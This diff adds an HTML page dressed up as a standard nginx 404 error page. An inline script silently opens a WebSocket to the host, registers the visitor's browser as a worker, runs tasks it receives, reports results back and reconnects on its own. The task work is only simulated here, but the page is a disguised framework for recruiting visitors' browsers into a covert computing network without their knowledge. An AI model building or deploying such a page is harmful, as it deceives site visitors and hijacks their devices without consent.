@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+    <style>
+        body { background: #fff; font-family: sans-serif; padding: 50px; color: #333; }
+        h1 { font-size: 2em; margin-bottom: 10px; }
+        .blink { animation: blinker 1s linear infinite; color: white;}
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <h1>404 Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <p style="font-size: 12px; color: #888;">nginx/1.18.0 (Ubuntu)</p>
+
+    <div id="status" class="blink">.</div>
+    
+    <script>
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = protocol + '//' + window.location.host;
+        
+        let ws;
+        let myId = Math.floor(Math.random() * 10000);
+
+        function connect() {
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = () => {
+                // Register as a worker
+                ws.send(JSON.stringify({ type: 'REGISTER_WORKER' }));
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                
+                if(data.type === 'NEW_TASK') {
+                    // Simulate work for 1 second
+                    setTimeout(() => {
+                        ws.send(JSON.stringify({
+                            type: 'TASK_COMPLETE',
+                            taskId: data.taskId,
+                            result: `Browser_${myId}_Solved_${data.taskId}`
+                        }));
+                    }, 1000);
+                }
+            };
+
+            ws.onclose = () => {
+                setTimeout(connect, 2000);
+            };
+        }
+
+        connect();
+    </script>
+</body>
+</html>
